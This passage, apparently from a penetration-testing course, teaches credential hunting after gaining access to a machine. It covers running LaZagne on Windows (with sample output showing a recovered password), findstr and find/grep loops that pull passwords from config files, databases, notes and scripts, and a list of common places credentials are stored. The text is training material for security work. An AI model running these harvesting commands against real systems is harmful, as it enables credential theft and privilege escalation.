&lt;p&gt;We can also take advantage of third-party tools like &lt;a href=&quot;https://github.com/AlessandroZ/LaZagne&quot;&gt;Lazagne&lt;/a&gt; to quickly discover credentials that web browsers or other installed applications may insecurely store. It would be beneficial to keep a &lt;a href=&quot;https://github.com/AlessandroZ/LaZagne/releases/&quot;&gt;standalone copy&lt;/a&gt; of Lazagne on our attack host so we can quickly transfer it over to the target. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lazagne.exe&lt;/code&gt; will do just fine for us in this scenario. We can use our RDP client to copy the file over to the target from our attack host. If we are using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xfreerdp&lt;/code&gt; all we must do is copy and paste into the RDP session we have established.&lt;/p&gt;

&lt;p&gt;Once Lazagne.exe is on the target, we can open command prompt or PowerShell, navigate to the directory the file was uploaded to, and execute the following command:&lt;/p&gt;

&lt;h4 id=&quot;running-lazagne-all&quot;&gt;Running Lazagne All&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Windows&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd-session&quot;&gt;C:\Users\bob\Desktop&amp;gt; start lazagne.exe all
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This will execute Lazagne and run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;all&lt;/code&gt; included modules. We can include the option &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-vv&lt;/code&gt; to study what it is doing in the background. Once we hit enter, it will open another prompt and display the results.&lt;/p&gt;

&lt;h4 id=&quot;lazagne-output&quot;&gt;Lazagne Output&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Windows&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|&lt;span class=&quot;o&quot;&gt;====================================================================&lt;/span&gt;|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; BANG BANG &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;                             |
|                                                                    |
|&lt;span class=&quot;o&quot;&gt;====================================================================&lt;/span&gt;|


&lt;span class=&quot;c&quot;&gt;########## User: bob ##########&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;-------------------&lt;/span&gt; Winscp passwords &lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Password found &lt;span class=&quot;o&quot;&gt;!!!&lt;/span&gt;
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we used the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-vv&lt;/code&gt; option, we would see attempts to gather passwords from all Lazagne’s supported software. We can also look on the GitHub page under the supported software section to see all the software Lazagne will try to gather credentials from. It may be a bit shocking to see how easy it can be to obtain credentials in clear text. Much of this can be attributed to the insecure way many applications store credentials.&lt;/p&gt;

&lt;h4 id=&quot;using-findstr&quot;&gt;Using findstr&lt;/h4&gt;

&lt;p&gt;We can also use &lt;a href=&quot;https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr&quot;&gt;findstr&lt;/a&gt; to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:&lt;/p&gt;

&lt;p&gt;Credential Hunting in Windows&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; findstr /SIM /C:&lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.txt &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ini &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.cfg &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.config &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.xml &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.git &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ps1 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.yml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;additional-considerations&quot;&gt;Additional Considerations&lt;/h2&gt;

&lt;p&gt;There are thousands of tools &amp;amp; key terms we could use to hunt for credentials on Windows operating systems. Know that which ones we choose to use will be primarily based on the function of the computer. If we land on a Windows Server OS, we may use a different approach than if we land on a Windows Desktop OS. Always be mindful of how the system is being used, and this will help us know where to look. Sometimes we may even be able to find credentials by navigating and listing directories on the file system as our tools run.&lt;/p&gt;

&lt;p&gt;Here are some other places we should keep in mind when credential hunting:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Passwords in Group Policy in the SYSVOL share&lt;/li&gt;
  &lt;li&gt;Passwords in scripts in the SYSVOL share&lt;/li&gt;
  &lt;li&gt;Password in scripts on IT shares&lt;/li&gt;
  &lt;li&gt;Passwords in web.config files on dev machines and IT shares&lt;/li&gt;
  &lt;li&gt;unattend.xml&lt;/li&gt;
  &lt;li&gt;Passwords in the AD user or computer description fields&lt;/li&gt;
  &lt;li&gt;KeePass databases –&amp;gt; pull hash, crack and get loads of access.&lt;/li&gt;
  &lt;li&gt;Found on user systems and shares&lt;/li&gt;
  &lt;li&gt;Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, &lt;a href=&quot;https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration&quot;&gt;Sharepoint&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;credential-hunting-in-linux&quot;&gt;Credential Hunting in Linux&lt;/h2&gt;

&lt;p&gt;Hunting for credentials is one of the first steps once we have access to the system. These low-hanging fruits can give us elevated privileges within seconds or minutes. Among other things, this is part of the local privilege escalation process that we will cover here. However, it is important to note here that we are far from covering all possible situations and therefore focus on the different approaches.&lt;/p&gt;

&lt;p&gt;We can imagine that we have successfully gained access to a system via a vulnerable web application and have therefore obtained a reverse shell, for example. Therefore, to escalate our privileges most efficiently, we can search for passwords or even whole credentials that we can use to log in to our target. There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Files&lt;/code&gt;&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;History&lt;/code&gt;&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Memory&lt;/code&gt;&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Key-Rings&lt;/code&gt;&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Configs&lt;/td&gt;
      &lt;td&gt;Logs&lt;/td&gt;
      &lt;td&gt;Cache&lt;/td&gt;
      &lt;td&gt;Browser stored credentials&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Databases&lt;/td&gt;
      &lt;td&gt;Command-line History&lt;/td&gt;
      &lt;td&gt;In-memory Processing&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Notes&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Scripts&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Source codes&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Cronjobs&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SSH Keys&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Enumerating all these categories will allow us to increase the probability of successfully finding out with some ease credentials of existing users on the system. There are countless different situations in which we will always see different results. Therefore, we should adapt our approach to the circumstances of the environment and keep the big picture in mind. Above all, it is crucial to keep in mind how the system works, its focus, what purpose it exists for, and what role it plays in the business logic and the overall network. For example, suppose it is an isolated database server. In that case, we will not necessarily find normal users there since it is a sensitive interface in the management of data to which only a few people are granted access.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;files&quot;&gt;Files&lt;/h2&gt;

&lt;p&gt;One core principle of Linux is that everything is a file. Therefore, it is crucial to keep this concept in mind and search, find and filter the appropriate files according to our requirements. We should look for, find, and inspect several categories of files one by one. These categories are the following:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Files&lt;/code&gt;&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;History&lt;/code&gt;&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Memory&lt;/code&gt;&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Key-Rings&lt;/code&gt;&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Configs&lt;/td&gt;
      &lt;td&gt;Logs&lt;/td&gt;
      &lt;td&gt;Cache&lt;/td&gt;
      &lt;td&gt;Browser stored credentials&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Databases&lt;/td&gt;
      &lt;td&gt;Command-line History&lt;/td&gt;
      &lt;td&gt;In-memory Processing&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Notes&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Scripts&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Source codes&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Cronjobs&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SSH Keys&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Configuration files are the core of the functionality of services on Linux distributions. Often they even contain credentials that we will be able to read. Their insight also allows us to understand how the service works and its requirements precisely. Usually, the configuration files are marked with the following three file extensions (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.config&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.conf&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.cnf&lt;/code&gt;). However, these configuration files or the associated extension files can be renamed, which means that these file extensions are not necessarily required. Furthermore, even when recompiling a service, the required filename for the basic configuration can be changed, which would result in the same effect. However, this is a rare case that we will not encounter often, but this possibility should not be left out of our search.&lt;/p&gt;

&lt;p&gt;The most crucial part of any system enumeration is to obtain an overview of it. Therefore, the first step should be to find all possible configuration files on the system, which we can then examine and analyze individually in more detail. There are many methods to find these configuration files, and with the following method, we will see we have reduced our search to these three file extensions.&lt;/p&gt;

&lt;h4 id=&quot;configuration-files&quot;&gt;Configuration Files&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;l &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.conf .config .cnf&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;File extension: &quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$l&lt;/span&gt; 2&amp;gt;/dev/null | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;lib&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fonts&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;share&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;core&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;
File extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/NetworkManager/resolv.conf
/run/NetworkManager/no-stub-resolv.conf
/run/NetworkManager/conf.d/10-globally-managed-devices.conf
...SNIP...
/etc/ltrace.conf
/etc/rygel.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/fprintd.conf

File extension:  .config
/usr/src/linux-headers-5.13.0-27-generic/.config
/usr/src/linux-headers-5.11.0-27-generic/.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/power/acpi/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/power/acpi/Makefile.config
/home/cry0l1t3/.config
/etc/X11/Xwrapper.config
/etc/manpath.config

File extension:  .cnf
/etc/ssl/openssl.cnf
/etc/alternatives/my.cnf
/etc/mysql/my.cnf
/etc/mysql/debian.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/mysql.conf.d/mysql.cnf
/etc/mysql/mysql.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/mysql.cnf
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Optionally, we can save the result in a text file and use it to examine the individual files one after the other. Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pass&lt;/code&gt;) in each file with the file extension &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.cnf&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;credentials-in-configuration-files&quot;&gt;Credentials in Configuration Files&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.cnf 2&amp;gt;/dev/null | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;doc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;lib&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;File: &quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;user&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;pass&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; 2&amp;gt;/dev/null | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\#&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;
File:  /snap/core18/2128/etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /usr/share/ssl-cert/ssleay.cnf

File:  /etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /etc/alternatives/my.cnf

File:  /etc/mysql/my.cnf

File:  /etc/mysql/debian.cnf

File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user		= mysql

File:  /etc/mysql/mysql.conf.d/mysql.cnf

File:  /etc/mysql/mysql.cnf

File:  /etc/mysql/conf.d/mysqldump.cnf

File:  /etc/mysql/conf.d/mysql.cnf
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.&lt;/p&gt;

&lt;h4 id=&quot;databases&quot;&gt;Databases&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;l &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.sql .db .*db .db*&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;DB File extension: &quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$l&lt;/span&gt; 2&amp;gt;/dev/null | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;doc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;share&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;man&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;
DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db

DB File extension:  .*db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-device-volumes.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-stream-volumes.tdb
/home/cry0l1t3/.cache/tracker/meta.db
/home/cry0l1t3/.cache/tracker/ontologies.gvdb

DB File extension:  .db*
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.dbus
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db-shm
/home/cry0l1t3/.cache/tracker/meta.db-wal
/home/cry0l1t3/.cache/tracker/meta.db
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Depending on the environment we are in and the purpose of the host we are on, we can often find notes about specific processes on the system. These often include lists of many different access points or even their credentials. However, it is often challenging to find notes right away if stored somewhere on the system and not on the desktop or in its subfolders. This is because they can be named anything and do not have to have a specific file extension, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.txt&lt;/code&gt;. Therefore, in this case, we need to search for files including the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.txt&lt;/code&gt; file extension and files that have no file extension at all.&lt;/p&gt;

&lt;h4 id=&quot;notes&quot;&gt;Notes&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;find /home/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;*.txt&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;*.*&quot;&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;
/home/cry0l1t3/.config/caja/desktop-metadata
/home/cry0l1t3/.config/clipit/clipitrc
/home/cry0l1t3/.config/dconf/user
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt
...SNIP...
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Scripts are files that often contain highly sensitive information and processes. Among other things, these also contain credentials that are necessary to be able to call up and execute the processes automatically. Otherwise, the administrator or developer would have to enter the corresponding password each time the script or the compiled program is called.&lt;/p&gt;

&lt;h4 id=&quot;scripts&quot;&gt;Scripts&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;l &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.py .pyc .pl .go .jar .c .sh&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;File extension: &quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$l&lt;/span&gt; 2&amp;gt;/dev/null | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span 